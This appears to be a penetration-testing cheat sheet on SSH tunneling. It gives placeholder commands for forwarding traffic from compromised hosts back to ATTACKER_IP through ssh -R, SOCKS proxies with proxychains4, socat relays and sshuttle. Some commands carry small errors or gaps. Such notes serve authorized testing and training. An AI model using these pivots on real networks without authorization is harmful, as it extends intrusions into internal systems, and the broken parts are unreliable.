# SSH Tunneling

With all of these, it can be good just to verify that the machine is listening on a given port after the tunnel is created.
This can be done with `ss -ntplu`

## Local Port Forwarding

Local SSH tunnel from `$OWNED_IP1` to some `EXTERNAL_IP` (run this from `${OWNED_IP0}`).
```
ssh -N -L 0.0.0.0:${OWNED_PORT0}:${EXTERNAL_IP}:${EXTERNAL_PORT} ${USER}@${OWNED_IP1}
```
This will allow traffic to go `${ATTACKER_IP} <--> ${OWNED_IP}:${OWNED_PORT} <--> ${EXTERNAL_IP}:${EXTERNAL_PORT}` 

## Dynamic Port Forwarding

If we want to be able to port-scan or otherwise interact with multiple ports of targets not directly reachable from our network,
we can use `proxychains4` with OpenSSH's dynamic port forward option.

With the following, OpenSSH opens a SOCKS proxy server:

```
ssh -N -D 0.0.0.0:${OWNED_PORT0} ${USER}@${ATTACKER_IP}
```

To make sure packages are sent in a compatible manner, we use `proxychains4`.
the default config is found in `/etc/proxychains4.conf`, but we can also specify a config file with `-f $pathToConfig`.

a config could be to add to a `proxychains4.conf`:

```
socks5 	${OWNED_IP0} ${OWNED_PORT0} 
```

Now, we can do eg. a call with smbclient like so:

```
proxychains4 -f proxychains4.conf smbclient ...
```
The trick is to use whatever tool you are calling with the same parameters you would otherwise with regards to IPs and ports, and just let proxychains handle the proxying.

## Remote Port Forwarding

(pre-req): This requires that we've setup an SSH server on our kali machine with:
```
sudo systemctl start ssh
```

If the firewall setup doesn't allow us to SSH from `${OWNED_IP}`, which we have compromised, it can make sense to remote port forward back to our `${ATTACKER_IP}` with (run from `${OWNED_IP0}`):
```
ssh -N -R 127.0.0.1:${OWNED_PORT0}:${EXTERNAL_IP}:${EXTERNAL_PORT} ${ATTACKER_USER}@${ATTACKER_IP}
```
Now, we can interact with `${EXTERNAL_IP}:${EXTERNAL_PORT}` via `127.0.0.1:${OWNED_PORT0}`.


## Remote Dynamic Port Forwarding
(pre-req): This requires that we've setup an SSH server on our kali machine with:
```
sudo systemctl start ssh
```

Also, note that the OpenSSH client needs to be version 7.6 (from 2017) or above for this to work.

From `${OWNED_IP}`, we can also do remote dynamic port forwarding with:

```
ssh -N -R ${PROXYCHAINS_PORT} ${ATTACKER_USER}@${ATTACKER_IP}
```
For this to work with `proxychains4`, we have to add the following to our config:

```
socks4 127.0.0.1 ${PROXYCHAINS_PORT}
```

Now, we can again interact with targets reachable from `${OWNED_IP}` from `${ATTACKER_IP}` by prefixing with `proxychains4` and then setting the IP/port of `${REMOTE_HOST}` we want to hit. 


## Utility tools

### sshuttle

sshuttle sets up a VPN-like connection between your machine and machines that are not directly reachable.

Get the subnets you want to tunnel through, and do:

socat port forward to the ssh server in `OWNED_IP1` and `OWNED_PORT1`:

```
socat -ddd TCP-LISTEN:${LISTENING_PORT0},fork TCP:${OWNED_IP1}:${OWNED_PORT1`}
```

Now, you get the subnets you want to tunnel through (these will be the subnets in `ip route` on `{OWNED_IP1}`) and do:

```
sshuttle -r ${USER}@${OWNED_IP0}:${OWNED_PORT0} ${SUBNET_IP1_1} ${SUBNET_IP1_2}
```
Once we authorize with local sudo and the pw of `$USER`,  we can now "directly" interact with hosts in `$SUBNET_IP1_2`, which were unreachable before.


### ligolo-ng

Consider looking into this tool.




### Ligolo-ng


